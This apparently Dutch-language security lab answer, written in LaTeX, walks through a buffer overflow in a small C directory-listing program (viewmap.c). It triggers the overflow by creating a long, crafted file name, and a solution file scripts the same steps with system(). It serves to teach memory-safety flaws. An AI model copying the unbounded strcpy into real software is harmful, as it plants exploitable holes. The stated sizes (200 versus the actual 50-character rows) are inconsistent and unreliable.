\begin{enumerate}
  \item gcc-3.3 -g -o viewmap viewmap.c
  \item gdb -q viewmap
  \item (gdb) list
  	\begin{enumerate}
  		\item char filelist neemt enkel bestandsnamen van lengte 200 aan.
  		\item Het aanmaken van een bestand \textgreater ~ 200 zal deze array overschrijven.
  	\end{enumerate}
  \item (gdb) quit
  \item touch ``\$(perl -e `print ``Bestand.txt'' . `` ''x39 . ``admin\_passwords.txt'' ')''
  	\begin{enumerate}
  	\item Het bestand met een lengte \textgreater ~ 200 is aangemaakt.
  	\end{enumerate}
  \item ./viewmap
  	\begin{enumerate}
  	\item Succes!
  	\end{enumerate}
  \item Een mogelijke oplossing is de volgende:
\end{enumerate}

\begin{lstlisting}
oplossing.c
-----------

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void){
	system("touch \"$(perl -e 'print \"Bestand.txt\" . \" \"x39 . \"admin_passwords.txt\"')\"");

	system("./viewmap");
}
\end{lstlisting}

\begin{lstlisting}
viewmap.c
---------

#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void){
	leesDir();
}

int countFiles(){
	int count = 0;
	DIR *d;
	struct dirent *dir;
	d = opendir(".");

	if (d)
	{
		while ((dir = readdir(d)) != NULL)
		{
			if(strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0){
				count++;
			}
		}

		closedir(d);
	}

	return count;

}

int leesDir(){
	char filelist[100][50]; // 100 strings van lengte 200

	DIR *d;
	struct dirent *dir;
	d = opendir(".");

	int teller = countFiles() - 1;
	int count = teller;

	if (d)
	{
		while ((dir = readdir(d)) != NULL)
		{
			if(strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0){
				strcpy(filelist[teller], dir->d_name);
				teller--;
			}
		}

		closedir(d);
	}

	int i = 0;
	for (i = 0; i < count + 1; i++)
		printf("%s\n",filelist[i]);

	return(0);
}
\end{lstlisting}